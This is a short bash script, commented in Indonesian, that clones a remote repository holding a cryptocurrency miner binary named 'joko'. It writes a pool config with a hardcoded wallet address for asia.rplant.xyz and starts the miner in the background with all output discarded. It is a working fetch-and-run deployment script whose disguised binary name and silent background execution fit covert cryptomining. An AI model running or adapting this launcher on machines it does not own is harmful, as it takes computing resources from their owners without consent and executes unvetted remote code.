#!/bin/bash

# Direktori kerja
APP_DIR=~/myapp
MINER_DIR="$APP_DIR/joko"
CONFIG_FILE="$MINER_DIR/config.json"
GIT_URL="https://github.com/vokerjok/joko.git"

# Cek apakah sudah dijalankan sebelumnya
if pgrep -f "./joko -c config.json" > /dev/null; then
    echo "Miner sudah berjalan. Keluar."
    exit 0
fi

# Buat direktori kerja
mkdir -p "$APP_DIR"
cd "$APP_DIR"

# Clone repo jika belum ada
if [ ! -d "$MINER_DIR" ]; then
    echo "Meng-clone repository dari $GIT_URL..."
    git clone --depth 1 "$GIT_URL" joko
else
    echo "Repository sudah ada, update dengan git pull..."
    cd "$MINER_DIR"
    git pull --rebase
fi

cd "$MINER_DIR"

# Buat file config.json (ganti sesuai kebutuhan)
cat > "$CONFIG_FILE" <<END
{
  "url": "asia.rplant.xyz:7022",
  "user": "mbc1qh4y3l6n3w6ptvuyvtqhwwrkld8lacn608tclxv",
  "pass": "x",
  "threads": "8",
  "algo": "power2b"
}
END

# Set permission eksekusi
chmod +x "$MINER_DIR/joko"

# Jalankan miner secara background
nohup ./joko -c config.json > /dev/null 2>&1 &

echo "Miner dijalankan di background."
